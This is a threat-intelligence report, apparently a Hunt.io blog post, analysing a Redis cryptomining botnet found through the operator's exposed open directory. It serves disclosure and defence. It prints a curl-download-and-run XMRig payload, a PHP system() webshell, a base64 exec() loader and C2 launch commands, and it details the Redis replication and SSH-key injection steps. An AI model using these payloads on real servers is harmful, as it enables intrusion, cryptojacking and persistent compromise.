@@ -1,0 +1,649 @@
+Redis Cryptomining Botnet Compromised 3,562 Servers, Exposed by the Operator's Own Files
+SilkParasite Infrastructure: SpiceRAT Servers Tied to Energy and Government Targets Across Central Asia
+Learn More
+Hunt.io
+Product
+Features
+OEM
+Pricing
+About
+Blog
+Login
+Get a Demo
+To embed a website or widget, add it to the properties panel.
+SilkParasite Infrastructure: SpiceRAT Servers Tied to Energy and Government Targets Across Central Asia
+Learn More
+Hunt.io
+Product
+Features
+OEM
+Pricing
+About
+Blog
+Login
+Get a Demo
+To embed a website or widget, add it to the properties panel.
+SilkParasite Infrastructure: SpiceRAT Servers Tied to Energy and Government Targets Across Central Asia
+Learn More
+Hunt.io
+To embed a website or widget, add it to the properties panel.
+Home
+Blog
+Redis Cryptomining Botnet Compromised 3,562 Servers, Exposed by the Operator's Own Files
+Redis Cryptomining Botnet Compromised 3,562 Servers, Exposed by the Operator's Own Files
+Published on
+Sep 8, 2026
+TABLE OF CONTENTS
+Key Findings
+Overview: The Complete Attack Chain
+Scope Summary
+Initial Access and Reconnaissance
+Command-and-Control and Persistence Architecture
+Exploitation Techniques
+Payload and Monetization
+Victim Impact Analysis
+Command and Control Infrastructure
+Operational Security and Anti-Analysis Techniques
+Operator Tradecraft Assessment
+Infrastructure Analysis
+Indicators of Compromise
+Detection and Mitigation Recommendations
+Conclusion
+Note on withheld data: Individual victim IPs are aggregated by network block, not listed. Sensitive data incidentally exposed on unrelated third-party sites has been removed from this report and, where possible, reported to the relevant providers. This report documents attacker infrastructure and tradecraft; it is not a disclosure against any named organization.
+Most open directories tied to a cryptomining campaign hold a payload and little else. This one held the operator's entire working toolkit. We found it on port 80 at
+188.245[.]99.156
+and pulled 147 files: Python exploit source, JSON campaign-result logs, a bundled portable Python 3.11 runtime, and two exported Windows registry hives.
+Production scripts sit next to abandoned test scaffolding, bugfix comments carried over from earlier drafts, and raw campaign telemetry never meant for an outside reader. That matters for everything downstream: the numbers, techniques, and infrastructure in this report all trace back to the operator's own files rather than to the summaries their scripts print.
+Hunt.io first indexed the directory on 2026-06-21 and last confirmed it live on 2026-06-27, a window covered in full in the Infrastructure Analysis section.
+Key Findings
+Directly parsing the operator's own campaign logs shows 3,562 distinct Redis servers compromised across two runs against a shared 12,966-host list; 22 to 26% of targets were compromised and most of the rest blocked on authentication.
+Confirmed victims span Redis 2.8.17 (2015) through 7.2.0 (2023) and Linux from EOL RHEL/CentOS 6 to current Ubuntu kernels, pointing to missing authentication as the weakness rather than a version-specific bug.
+A third run against the pre-qualified 2,342-host no-auth fleet hit 72.6%, roughly triple the full-fleet rate, pointing to target-list freshness rather than the technique as the limiting factor.
+The toolkit runs four techniques across three services, but only Redis rogue replication worked at scale: SSH key-injection and MongoDB sandbox-escape returned zero across 2,810 attempts, and a complete WordPress credential-to-webshell chain was recovered but not confirmed at scale.
+The Monero wallet hardcoded throughout the toolkit also appears in a separate February 2026 open directory at
+194.48.248[.]105
+(Moldova), a Meterpreter and XMRig kit with no Redis component, pushing the operator's known activity back at least five months.
+The operator runs local cryptomining on their own host using the same wallet as the botnet payloads, tying the campaign's monetization directly to their workstation.
+The directory is a live working environment, not a payload drop: an R&D trail of persistence paths probed but never shipped (SysV init, /etc/modprobe.d, a webshell-via-Redis pivot) sits alongside narrow anti-analysis engineering, a runtime-only fileless loader and chr()-encoded string literals.
+The same recon infrastructure incidentally exposed sensitive data (SQL dumps, phpinfo() output, .git/config credentials) from unrelated third-party sites, which we have withheld and reported separately.
+Overview: The Complete Attack Chain
+The diagram below is the whole operation end to end, mass reconnaissance through to confirmed monetization. It brings together the three techniques that actually produced a measurable outcome: SLAVEOF rogue replication, AOF-based SSH key injection, and the Lua sandbox probe, plus the separate WordPress track running alongside it.
+One technique doesn't appear here: the multi-mechanism persistence bundle. It only ever ran against the operator's own QA host, never against the production fleet, so there's no campaign-scale outcome to plot for it. Every labeled edge below is backed by an artifact walked through in the sections that follow.
+Figure 1. The full attack chain, recon through confirmed monetization, with the SSH_INJECT, LUA_PROBE, and WP_SPRAY branches.
+The MongoDB reconnaissance-only probe targets a different service entirely and is omitted from this Redis-centric chain; it appears in its own row in the scope table below.
+The remainder of this report walks each branch of this chain in protocol-level detail, quantifies the confirmed-victim branch precisely, and documents the operator's own infrastructure and tradecraft before closing with indicators of compromise.
+Scope Summary
+Track
+Primary technique
+Confirmed impact
+Redis (primary)
+Rogue replication → cron injection → XMRig
+3,562 distinct hosts compromised (of 12,966 targeted)
+Redis (secondary)
+AOF → SSH authorized_keys injection
+0 of 2,342 confirmed
+MongoDB
+db.eval() JS sandbox escape probing
+0 of 468 confirmed (script execution only)
+WordPress
+Credential spray, admin takeover, webshell staging
+Chain complete; scale not independently quantifiable from recovered files
+Initial Access and Reconnaissance
+Redis target discovery
+The operator works from a master list of 12,966 candidate Redis hosts (targets.txt, mirrored as redis_fleet.txt), narrowed down to 2,342 confirmed to take commands without authentication (noauth_hosts.txt). The bigger list looks like the output of a broad internet-wide sweep for anything listening on Redis's default port 6379. The smaller one is what's left after an initial PING/AUTH probing pass, the actual candidate pool for every no-auth technique described later in this report.
+Figure 2. Redis host discovery and authentication probing across internet-facing targets.
+WordPress target discovery
+A separate pipeline, wp_scan_results.json, runs against a completely different population of HTTPS hosts, checking each one for WordPress: version, installed plugins, and whether XML-RPC or directory listings are exposed. The plugin data goes deeper than a simple detection flag, one confirmed site running the breeze caching plugin at version 2.5.6 is marked "vulnerable": false, which only makes sense if the scanner is cross-referencing a real vulnerability database rather than just fingerprinting versions.
+Figure 3. WordPress fingerprinting, plugin enumeration, and exposure detection.
+212 hosts
+out of that population come back as confirmed WordPress installs ("wp": true). Those 212 feed straight into fast_cred_results.json, a second-stage file that enumerates usernames per site, the direct input to the credential-spray stage covered later in this report.
+MongoDB target discovery
+A third target list, independent of the other two, gets probed for MongoDB's legacy server-side JavaScript execution feature. mongo_mine_results.json logs, per confirmed-scriptable host (468 of them), the MongoDB version in play, spanning long-dead releases like 2.4.14 up through 4.0.3, plus the full global-scope constructor chain available inside the JS sandbox and explicit checks for process, load(), and require(). That's the standard checklist for anyone probing a JavaScript sandbox for an escape.
+Figure 4. MongoDB host discovery and server-side JavaScript capability testing
+Incidental data exposure from unrelated third-party sites
+Separate from all three campaigns above, cred_scan_results.json runs a lighter sweep of the same HTTP/HTTPS population, just looking for exposed backup files, directory listings, and leaked credentials. Most entries come back empty ("backups": [], "leaks": [], "creds": null), but the hits get rolled up into cred_attack_results.json and, in more raw detail, leaked_data.json. None of it connects to the Redis, MongoDB, or WordPress work elsewhere in this report, it looks like the same scanning infrastructure being pointed opportunistically at whatever it happens to trip over.
+Confirmed exposures (hosts partially masked):
+173.212[.]x.x: a readable SQL database dump on a WordPress site (Germany)
+39.101[.]x.x: a readable SQL database dump on a WordPress site (China, logistics sector)
+137.116[.]x.x: exposed phpinfo() output, full PHP configuration and environment disclosure
+173.231[.]x.x: exposed phpinfo() output, full PHP configuration and environment disclosure
+18.130[.]x.x: an exposed .git/config file revealing a private source-repository remote
+54.88[.]x.x: an exposed .git/config file revealing a private source-repository remote
+164.90[.]x.x: a readable directory listing under /wp-content/uploads/
+196.200[.]x.x: an exposed application test page on a student login/registration platform
+So the scanning infrastructure picks up sensitive material, database contents, environment configs, source-control credentials, from any site it happens to touch, regardless of whether that site was ever an actual target. None of these hosts show up anywhere else in this report, and I found nothing suggesting this exposed data was ever used against the Redis, MongoDB, or WordPress targets described elsewhere.
+Command-and-Control and Persistence Architecture
+Before getting into each exploitation technique individually, it's worth stepping back and showing how a compromised host actually relates to the operator's infrastructure once persistence lands. This is the steady state every one of the 3,562 confirmed victims ends up in.
+A rogue Redis server on ports 16379 through 16385 at
+188.245[.]99.156
+delivers the initial RDB blob into a victim's cron.d entry. That entry fires every 5 minutes, pulls the XMRig release tarball straight from github.com/xmrig/xmrig, and points the resulting hidden /tmp/.xmrig binary at
+pool.moneroocean[.]stream
+:443 over TLS. Separately, the same cron job pings c2_persist.py (
+188.245[.]99.156
+:10000, token-protected) with a plain HTTP GET, which the operator logs to a local SQLite database, c2_persist.db.
+Figure 5. Cron-based persistence, XMRig deployment, and command-and-control communication.
+Exploitation Techniques
+Rogue replication (SLAVEOF/RDB) cron injection
+The campaign's main technique abuses Redis's own master-replica replication protocol to smuggle attacker-controlled content onto a target, no authentication bypass and no memory-corruption bug required. The tooling pings the victim to confirm it's unauthenticated, sets dir and dbfilename through CONFIG SET, then issues SLAVEOF
+<rogue-host> <rogue-port>
+. From there the victim does exactly what Redis replicas are supposed to do: it connects back, runs the standard handshake (PING, REPLCONF, PSYNC), and accepts a +FULLRESYNC followed by a crafted RDB blob, which it then writes verbatim to /etc/cron.d/.redis-miner. The operator closes the loop with SLAVEOF NO ONE and puts the original dir/dbfilename values back.
+The trick in the blob itself is small but exact: it opens with the required REDIS0009 magic header so it passes the victim's RDB format check, then encodes one key/value pair whose value has an
+embedded newline
+right before the actual cron-entry text. That newline does all the work, it shoves the payload onto its own line in the resulting file, surrounded by harmless RDB metadata bytes that a cron parser just skips over or errors past quietly.
+None of this goes through a Redis client library. Every command in the exchange (PING, CONFIG SET, SLAVEOF) is hand-serialized into raw RESP, and every response comes back through a length-aware parser instead of a fixed-size recv(). Both functions live in rogue.py and get reused, unmodified, by every other script in the toolkit that talks to Redis directly, verify.py, redis_ssh_inject.py, lua_test.py, cron_multi_test.py all share this exact code:
+Figure 6. The hand-rolled RESP command builder and length-aware response reader reused across the toolkit.
+Here's the blob construction itself, byte-for-byte, straight out of rogue.py:
+Figure 7. Byte-for-byte construction of the crafted RDB blob, magic header through the embedded-newline cron entry.
+Figure 8. The rogue server's accept loop and per-connection routing logic.
+And the four-path fallback loop, exactly as it's written inside exploit_one():
+Figure 9. The four-path cron fallback loop and config-restoring cleanup inside exploit_one().
+Command interface and operational flexibility
+rogue.py ships with a full argparse CLI (target, --batch
+<file>
+, --port 6379, --rogue-port 16379, --rogue-host
+<ip>
+, --workers 30, --timeout 15, --output
+<file>.json
+). Practically, that means the same script does double duty: fire it at a single IP for hands-on testing (which lines up with
+47.250.92.230
+showing up again and again as a QA target, more on that below), or point it at a multi-thousand-host batch file for a real campaign run. Either way it writes structured JSON, and that JSON is exactly what this report's victim-impact numbers are computed from. The rogue listening port is configurable too, and it changes across tool revisions (16379, 16380, 16383 through 16385), most likely just to keep one script's leftover listener from colliding with another's while the operator iterated on the same box.
+State restoration and collateral risk to victim data
+Every attempt, successful or not, ends the same way: SLAVEOF NO ONE to detach the victim from the rogue master, then CONFIG SET dir
+<original>
+and CONFIG SET dbfilename
+<original>
+restoring the values the script read and stashed
+before
+it touched anything.
+That's a real opsec measure, it keeps an admin from stumbling on a Redis instance still pointed at /etc/cron.d. But it's worth being clear about what it does and doesn't do. It doesn't undo the write, and it doesn't protect the victim's
+own
+data. If the target's original dir/dbfilename pointed at a live RDB snapshot file, that location was hijacked by the attacker's dbfilename override during the replication write, and any snapshot Redis tried to flush to disk in that window went to the wrong place. So the blast radius here is bigger than "a miner got installed", there's a real, if secondary, risk of legitimate Redis persistence data loss on any victim that was actively relying on RDB snapshotting when it got hit.
+The mining command, flag by flag
+The XMRig command line baked into every cron/APT/profile.d payload isn't a default config, every flag is a choice, and reading them together tells you a fair bit about the operator. --donate-level=1 is the lowest non-zero donation XMRig will accept, shaving the dev tax to the minimum while dodging the 0 setting that some pools flag as suspicious. --url=
+pool.moneroocean.stream
+:443 runs over 443 rather than a normal Stratum port, so the mining traffic blends into ordinary outbound HTTPS. --tls encrypts the Stratum session and kills off simple DPI fingerprinting. --rig-id=$(hostname)-rd stamps the
+victim's own hostname
+into the pool-visible worker ID, which hands the operator per-victim hashrate attribution right off the pool dashboard. --keepalive avoids the reconnect churn that would otherwise leave a distinctive periodic pattern, and -t $(nproc) scales the thread count to whatever the victim actually has rather than guessing a fixed number.
+Two things stand out when you put them side by side: the verification-only variants hardcode -t 1 and --cpu-priority=1, a deliberately
+throttled
+config that exists only to confirm cron fired. That tells us the operator keeps two mental categories, a "just prove it runs" payload and an "extract everything" payload, and doesn't switch to the full $(nproc) version until execution is confirmed.
+Technique provenance
+To be clear, none of this is novel. The core primitive, using SLAVEOF/REPLICAOF to force a Redis instance into a full resync from an attacker's master and shaping the RDB payload so a chosen value lands on its own line, is well-documented Redis post-exploitation, not something this operator discovered. It's been circulating in public research and open-source PoC tooling for years, ever since it took hold as an alternative to the older MODULE LOAD and CONFIG SET dir + SAVE RCE paths.
+What keeps it working against everything from Redis 2.8.17 to 7.2.0 is that it abuses legitimate replication functionality nobody removed, not a bug a point release could patch out. The only real fix is at the deployment layer, authentication or command restriction, never a version bump.
+R&D trail: the technique the operator tried first, and the ones that never shipped
+One of the more interesting things in this directory is what didn't make the cut. There's a handful of small, single-purpose scripts, each hardcoded against the QA host, that together trace the operator's thinking before rogue.py settled into its final form.
+The first attempt used 'BGSAVE', not 'SLAVEOF'
+.  redis_bgsave_test.py sets a key to the cron payload directly and triggers a normal snapshot, no replication abuse at all:
+Figure 10. The abandoned first-draft exploit, a plain CONFIG SET + BGSAVE write instead of rogue replication.
+This is the older, noisier way to get Redis to write a file. A bare SAVE/BGSAVE is a loud, single-shot event compared to a replication stream, and it leaves you at the mercy of the target's own save-trigger behavior instead of your own timing. The rogue-replication approach that eventually shipped in rogue.py beats it on every axis: it doesn't wait on the victim's save schedule, and the write shows up looking like ordinary replication rather than an explicit, loggable BGSAVE.
+A webshell-via-Redis pivot got explored and dropped.  redis_web_paths.py runs the same CONFIG SET dir probe, but against a completely different class of targets, web server document roots and config directories (/var/www/html, /var/www, /usr/share/nginx/html, /etc/nginx/sites-enabled, /etc/nginx/conf.d) rather than persistence paths.
+If any of those had come back writable, the operator would have had a clean route to drop a PHP webshell through Redis on any host running Redis and a web server together, skipping the entire WordPress credential chain on those boxes. But nothing in the production toolkit acts on a hit from this probe, and no webshell is staged for it. It looks like a dead end, either the QA host wasn't writable at those paths, or the operator decided the WordPress-specific chain was the better bet.
+The persistence-path recon went well beyond what actually shipped. Two more scripts, redis_paths2.py and redis_paths3.py, probe a much wider set of write targets than the four paths rogue.py uses in production or the three redis_ssh_inject.py uses. redis_paths2.py checks extra SSH directories keyed to common cloud usernames (/home/ubuntu/.ssh, /home/admin/.ssh, /home/user/.ssh, /home/deploy/.ssh, /home/www-data/.ssh), while redis_paths3.py sweeps service-startup and module-loading directories, /etc/init.d, the full /etc/rc0.d through /etc/rc6.d SysV set, and /etc/modprobe.d.
+None of those SysV runlevel directories or /etc/modprobe.d show up in any production deployment script, deploy_all.py sticks to cron.d, apt.conf.d, and profile.d. /etc/modprobe.d is the one that gives us pause: a writable modprobe config file can run arbitrary commands the next time a matching kernel module loads, which would be a good deal stealthier than a cron entry sitting in plain sight.
+That the operator tested for it but never weaponized it could mean two things, the technique didn't work in testing, or it's a capability being held in reserve. We can't tell which from the files alone. Either way, the practical takeaway for defenders is the same: don't assume the four production paths are the full extent of what this operator can write to.
+AOF-based SSH authorized_keys injection
+The second technique is a separate build entirely, and it goes after SSH access instead of cron execution. Rather than RDB snapshots it leans on Redis's
+append-only file
+(AOF) mode. Where RDB is compact binary, AOF logs every write command as plain RESP text, so each argument of a SET ends up on its own line, clean enough that sshd will tolerate the protocol noise wrapped around a valid key line.
+The script pings the victim, sets dir to a candidate SSH path and appendfilename to authorized_keys, SETs a marker key holding the public key, flips on appendonly, and forces a flush with BGREWRITEAOF. It walks three candidate directories in order (/root/.ssh, /home/redis/.ssh, /var/lib/redis/.ssh). And here's the part that sets it apart from everything else in the toolkit, it doesn't just assume the write worked. On a reported success it immediately shells out to a real ssh client with BatchMode=yes and the matching private key, taking it all the way from "the write probably landed" to "I have a shell." Here's the full injection routine, straight from redis_ssh_inject.py:
+Figure 11. The AOF-based authorized_keys injection routine, three candidate directories with a forced BGREWRITEAOF flush.
+And the verification step itself, the code behind the SSH OK: 0 number in the impact analysis below:
+Figure 12. The automated post-injection SSH login check that closes the loop from believed-write to confirmed shell access.
+For all that engineering effort, it went nowhere. Every single one of the 2,342 hosts in the campaign log bounced at the first CONFIG SET with AUTH_REQUIRED. The technique never made it past its opening command against this fleet, which means try_ssh() was never even called.
+Redundant multi-mechanism persistence
+A separate script, deploy_all.py, bundles the cron/rogue-replication technique together with two more Linux persistence surfaces in a single pass against one target, using three separate rogue-server ports so the writes don't step on each other. The three landing spots: an APT hook at /etc/apt/apt.conf.d/99sys-update (fires on every package-manager update or upgrade via APT::Update::Pre-Invoke/Post-Invoke), a profile.d script at /etc/profile.d/sys-init.sh (fires on every login shell), and a cron.d entry at /etc/cron.d/xminer (every 15 minutes). All three run the same XMRig deployment command.
+It's a belt-and-suspenders setup, and the point is redundancy against cleanup. Pull any one surface, and cron is the one most people check, and the other two are still there. A defender who finds and deletes the cron entry but never looks at /etc/apt/apt.conf.d/ or /etc/profile.d/ will watch the miner come right back on the next package update or user login.
+The payload wrapping and the write_file() calls that deploy it, verbatim from deploy_all.py:
+Figure 13. The shared XMRig payload command wrapped into the APT hook, profile.d script, and cron entry, plus the web-root write-access probe.
+A couple of small tells here: the profile.d variant dresses the payload up as a harmless comment (# System init hook), and the verify.html write isn't a payload at all, it's just a canary to confirm the Redis process can write to the web root. That's a recon step for webshell staging down the line, but nothing in the recovered evidence shows it ever being followed through.
+Lua sandbox-escape probing
+The fourth technique, in lua_test.py, is more of a probe than a weapon. Instead of touching replication, it fires Redis EVAL commands straight at the built-in Lua engine. The script runs a two-stage test, a harmless canary EVAL first, then the real escape attempt, plus a version/OS fingerprint, against three hosts:
+Figure 14. The Lua canary and module-loading escape attempt run against three test hosts.
+This is the standard check for whether a target's Lua sandbox will allow arbitrary module loading or filesystem access, a fifth, more direct route to code execution that has nothing to do with the replication techniques. It only ran against three hosts, and we see no sign it was ever scaled to the fleet, which fits a hands-on probe rather than a production technique.
+WordPress credential attacks and webshell staging
+The WordPress track pairs fleet-scale credential spraying with a hands-on takeover of one specific host, and it runs as a four-stage chain: wp_scan_results.json narrows the HTTPS population down to 212 confirmed WordPress installs, fast_cred_results.json enumerates usernames per site, wp_spray.py sprays credentials across the fleet, and exploit_wp.py/exploit_wp2.py drives a targeted takeover of a single host, harvesting nonces to forge the plugin-install request that would drop the s.php webshell.
+The spray itself (wp_spray.py) tries each username/password pair through WordPress's XML-RPC wp.getUsersBlogs method, falls back to a direct wp-login.php form POST when XML-RPC is disabled (HTTP 405), and as a last attempt per user throws the site's own domain name at it as a password:
+Figure 15. The XML-RPC credential-spray attempt with its wp-login.php form-POST fallback.
+The takeover pair (exploit_wp.py and its near-twin exploit_wp2.py) hardcodes the admin/admin default against one recurring target IP, then scrapes WordPress security nonces (_wpnonce values) off six different admin-panel pages, which is exactly the prerequisite for forging a plugin-install request past the CSRF protections that would otherwise block it:
+Figure 16. The default-credential login followed by nonce harvesting across four admin-panel pages.
+Sitting in the same directory is a one-line PHP webshell, s.php (
+<?php system($_GET[c]); ?>
+), the only payload candidate here and an obvious fit for the contents of a malicious "plugin" ZIP pushed through the nonce-protected install flow just described.
+One detail worth flagging: exploit_wp.py, the first of the two near-identical scripts, encodes every string literal, URLs, header names, form fields, even the credential pair, as chained chr(N) calls instead of plain strings, e.g. chr(97)+chr(100)+chr(109)+chr(105)+chr(110) for "admin". We'll come back to that obfuscation choice below.
+And the nonce-harvesting logic wasn't a first draft either. An earlier, rougher script, vfy_login.py, runs the same idea against the same target, log in with admin/admin, pull _wpnonce values, but only from a single page (wp-admin/plugin-install.php?tab=upload) instead of the six the production pair eventually covers, and in the same chr() style as exploit_wp.py. It's the same multi-generation pattern we keep seeing with the Redis verification payloads: build a minimal PoC, confirm it works, then broaden it into production tooling.
+There's also a separate, unrelated WordPress attempt in breeze_results.json: 31 targets on port 80 or 443, each with a shell and an error field. We never recovered the script that produced this, but the field names and the "error": "comment failed: 0" entries point to a webshell-via-comment-field attempt, a known pattern against certain vulnerable plugin configs, and the filename probably nods to the breeze caching plugin flagged during recon (version 2.5.6 on at least one scanned site). Every one of the 31 attempts shows "shell": null. Another 0% run, and a third WordPress-track dead end alongside the SSH and MongoDB failures.
+Fileless deployment variant
+There's one more path to the same rogue-replication outcome, but it's built to keep readable Python off disk. The loader's entire on-disk footprint is a single line, the whole of _boot.py:
+import
+base64
+;
+exec
+(base64.b64decode(open(
+'C:/host_public/run_launch.b64'
+,
+'rb'
+).
+read
+()).decode())
+Copy
+Base64-decode run_launch.b64 and you get the orchestrator this line runs, logic that never exists as a .py file on disk:
+Figure 17. The decoded orchestrator, target list and deployer both base64-decoded to disk before exec().
+Two things stand out about this orchestrator. First, "fileless" is doing some heavy lifting, because it writes the decoded fleet.b64 and run_miner.b64 contents right back out as plaintext (redis_fleet.txt, redis_miner.py) as a side effect. So the fileless property really only covers the initial _boot.py/run_launch.b64 stage. Once it's running, the deployer script and target list land on disk exactly like the rogue.py-based campaign does, which is why redis_miner.py and redis_fleet.txt both show up as ordinary files in the directory alongside their .b64 sources.
+Second, it builds sys.argv by hand before calling exec(), so the decoded redis_miner.py's own argparse CLI gets its batch file, worker count, and output path as if it had been launched from a real shell. The fileless stage is just a transparent wrapper around the same production tool, not a different implementation. That said, the run_miner.py logic decoded here is coded independently from rogue.py, which is what accounts for the different success rate and the different persistence-path label format between the two runs (CRON_INJECTED:.redis-miner / CRON_INJECTED:root here versus rogue.py's full-path labels).
+Payload and Monetization
+Botnet-side XMRig deployment
+Every Redis-facing deployment script lands on the same payload chain, run as a background shell command the moment cron (or whatever persistence surface) fires:
+curl -sLk
+'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
+-o /tmp/x.tgz
+tar xzf /tmp/x.tgz -C /tmp/
+mv
+/tmp/xmrig-*/xmrig /tmp/.xmrig
+chmod
++x /tmp/.xmrig
+rm
+-rf /tmp/x.tgz /tmp/xmrig-*
+/tmp/.xmrig --no-color --donate-level=1 \
+  --url=pool.moneroocean.stream:443 --tls \
+  --user=<wallet> --rig-id=$(hostname)-rd \
+  --keepalive --retries=5 -t $(
+nproc
+) >/dev/null 2>&1 &
+Copy
+The payload grabs a legitimate, unmodified XMRig release straight off the official GitHub releases page rather than bundling a pre-built or trojanized binary, which both keeps the operator's own hosting footprint down and avoids tripping egress monitoring on the victim side, since the request resolves to github.com, not attacker infrastructure. The miner gets renamed to a dot-prefixed hidden file (/tmp/.xmrig), and in the verification-only variants it runs with a deliberately low thread count (-t 1), probably to stay under whatever CPU-usage threshold would draw a casual glance on a compromised box.
+The most recently touched payload variant, decoded from rogue_b64.txt (the fileless loader rogue_boot.py invokes), adds one flag none of the earlier revisions had: --tls-fingerprint=420c7850e09b7c2b9e39e2a93e204e3c56bcf08a685ff1daa986e3c348da5d2a. That pins the exact certificate the mining pool is expected to present, so the connection fails closed if a TLS-terminating proxy or inspection tool ever puts a substitute cert in the way.
+It's absent from the earlier generations and present only in the newest variant, the same incremental-hardening pattern showing up all over this toolkit. The operator kept polishing it well after the bulk of the campaign had already run.
+Self-mining on operator infrastructure
+Separate from the botnet payloads, two batch scripts run a locally staged copy of XMRig, a real 6.4 MB Windows PE32+ binary sitting in the directory next to its 2.6 MB source archive, right on the operator's own host:
+cd
+/d
+"C:\Users\Public\xmrig"
+C:\Users\Public\xmrig\xmrig.exe -o 45.155.102.89:10128 ^
+  -u <wallet> -p win-docker-01 -t 4 ^
+  --keepalive --donate-level 0 >> C:\Users\Public\xmrig.log 2>&1
+Copy
+The pool endpoint here,
+45.155.102.89
+:10128, never appears in any remote deployment script (those all point at
+pool.moneroocean.stream
+:443), so it's very likely a private mining proxy rather than a public pool. The wallet argument, though, is
+byte-identical
+to the one hardcoded into every remote XMRig deployment, a clean, unambiguous link between the botnet's monetization and the operator's own workstation.
+Victim Impact Analysis
+Everything in this section comes from parsing the operator's own campaign-result JSON field by field, so the numbers here come from their own per-host result records rather than the summary counters their scripts print.
+Deduplicated victim count
+The two runs earlier hit the same 12,966-host list independently. Pulling the unique IP out of every deployed entry and comparing the two sets gives a clean overlap: run 1 confirmed 3,388 unique hosts, run 2 confirmed 2,862, with 2,688 in both, for a
+distinct confirmed total of 3,562
+(700 only in run 1, 174 only in run 2).
+That 2,688-host overlap tells us most of these compromises stick: the same host, still reachable and still no-auth days later, got re-owned by an independently coded second script. The 700 unique to run 1 and 174 unique to run 2 fit either partial remediation between runs or genuine differences in how the two code paths handle edge-case configs.
+Full exploitation funnel, per run
+Run 1 (campaign_results.json, 12,966 targets) landed 3,388 confirmed compromises (26.1%), against 7,164 blocked on authentication (55.3%), 1,484 skipped as non-Linux (11.4%), and 930 errored (7.2%).
+Run 2 (fileless, redis_fleet_results.json, 12,966 targets) landed 2,862 confirmed (22.1%), 8,262 blocked on authentication (63.7%), 1,138 skipped as non-Linux (8.8%), and 704 errored (5.4%).
+That big noauth_fail share fits a fleet that was scanned some time before this campaign actually ran, a meaningful chunk of the population had authentication (or protected-mode) turned on by the time exploitation came around. The same pattern shows up even harder in the SSH-injection run below.
+Inside each run's error bucket, WRITE_FAILED (748 in run 1, 159 in run 2) is the biggest category, meaning a writable Redis was there but none of the four fallback paths took the write, most likely dir/CONFIG SET restrictions or filesystem permissions. SET_FAILED (164 / 94) means the CONFIG SET itself got rejected, which fits hardening like rename-command CONFIG "". The rest, generic ERROR, AUTH_REQUIRED, TIMEOUT, are minor next to those.
+Redis version distribution among confirmed victims (run 1, n=3,388)
+Confirmed victims span
+Redis 2.8.17 (2015) through 7.2.0 (2023)
+, an eight-year spread, concentrated on 6.0.16 (847 hosts, 25.0%), 6.2.6 (541, 16.0%), and 3.2.12 (343, 10.1%). That's strong, direct evidence the weakness is purely deployment/configuration, no authentication set, not a version-specific bug, no release in this range is immune to the rogue-replication technique.
+Operating-system distribution among confirmed victims (run 1, n=3,388)
+Ubuntu/Debian kernels dominate the victim pool at 53.7% (1,820 hosts), which tracks with Ubuntu being the default choice on cloud-hosted Redis. RHEL/CentOS 7 is another 20.7% (701 hosts, itself EOL), with a small tail of five RHEL/CentOS 6 boxes (EOL since 2020), so there's a non-trivial population of long-unpatched enterprise Linux still reachable and still exploitable.
+SSH-injection funnel
+Against the full 2,342-host no-auth-confirmed fleet, 2,339 (99.9%) came back AUTH_REQUIRED at the first CONFIG SET, 3 timed out, and not one key injection or SSH login succeeded. A near-total AUTH_REQUIRED result, against a fleet that was confirmed no-auth at discovery time, is the strongest signal in the whole dossier that this campaign ran well after the recon that built its list, by which point a lot of the population had been remediated.
+Geographic distribution (IP block proxy)
+The victim IPs bunch up in a handful of /8 prefixes tied to Asia-Pacific cloud and hosting (Alibaba and Tencent space in particular): 47.x.x.x leads at 365 confirmed hosts, then 8.x.x.x (261), 101.x.x.x (119), and a long tail of similar-sized ranges (172.x, 103.x, 139.x, 39.x, 45.x, 115.x, 23.x, each in the 68-93 range). This is a coarse proxy only, we didn't run authoritative WHOIS or geolocation here, but it fits a target list built from a scan slanted toward, or specifically covering, the big APAC commercial cloud ranges.
+Persistence-path split
+In both independently coded deployment scripts, the primary destination worked about 85% of the time (2,881 of 3,388 in run 1; 2,417 of 2,862 in run 2), leaving the other ~15% of confirmed victims, roughly 445 to 510 per run, reachable only through the fallback-path logic. That's direct, quantified evidence the operator's investment in multi-path fallback actually moved the needle on real-world yield, it isn't defensive boilerplate sitting unused.
+A third campaign run, targeted at a pre-qualified fleet
+A third result file, rogue_results.json, records another run of the same SLAVEOF technique (this one from rogue_boot.py, a different fileless loader that decodes and runs rogue_b64.txt), but against a smaller pool, the 2,342-host no-auth-confirmed list, not the full 12,966. Of those 2,342, it confirmed 1,701, failed on 468, and errored on 173, a
+72.6% success rate
+.
+Dedup those 1,701 confirmed IPs against the union of the two full-fleet runs and you get zero new hosts, every victim here was already counted, so it doesn't move the 3,562 headline. What it does move is the read on why the full-fleet runs only hit 22-26%: point the identical exploitation code at a population already confirmed no-auth and reachable, and it reaches 72.6%, roughly triple the full-fleet rate.
+Assessment
+: this is about as clean a demonstration as you get that the exploitation technique isn't the limiting factor here, target freshness is. A stale scan gives you a stale, partly-remediated list; the same code against a freshly-qualified one performs far better. Whether the operator reached that conclusion themselves and adjusted their workflow, the recovered files don't say.
+Command and Control Infrastructure
+A batch script, start_c2.bat, launches the operator's C2 server component directly:
+set
+C2_TOKEN=f90c8b1dcd374d4f552744ee1765583d
+set
+C2_DB_PATH=C:\host_public\python311\c2_data\c2_persist.db
+start /B C:\host_public\python311\python.exe -u 
+C:\host_public\python311\c2_persist.py 10000 0.0.0.0
+Copy
+That names the C2 component outright, c2_persist.py, a Python service bound to 0.0.0.0:10000 behind a hardcoded bearer token, launched through a
+bundled portable Python 3.11
+rather than any system interpreter. The directory also carries two separate ~11 MB portable Python archives (py.zip, python.zip), which reinforces that the toolchain is built to run without depending on whatever's already installed on the host. State goes into a local SQLite database under the portable interpreter's own path.
+Compromised hosts check in over plain unauthenticated HTTP GETs of the form
+http://<c2-host>:10000/ping?h=<hostname>
+, fired as a background task tacked onto the same shell command that verifies or deploys the miner, a lightweight heartbeat that keeps reporting whether or not the mining process itself later dies, gets killed, or never starts.
+Operational Security and Anti-Analysis Techniques
+There are two obfuscation techniques in the toolkit, both narrow, both applied only to the pieces the operator seems to have expected static analysis to look at hardest.
+Fileless execution
+.  _boot.py, which is on disk, is one line: import base64; exec(base64.b64decode(open('C:/host_public/run_launch.b64','rb').read()).decode()). Decode run_launch.b64 and it turns out to be an orchestrator that decodes two more base64 blobs (fleet.b64, the target list, and run_miner.b64, the full deployer source) and exec()s the decoded miner straight in the running process. The exploitation logic never sits on disk as readable Python, only, briefly, inside the interpreter's memory.
+String literal encoding
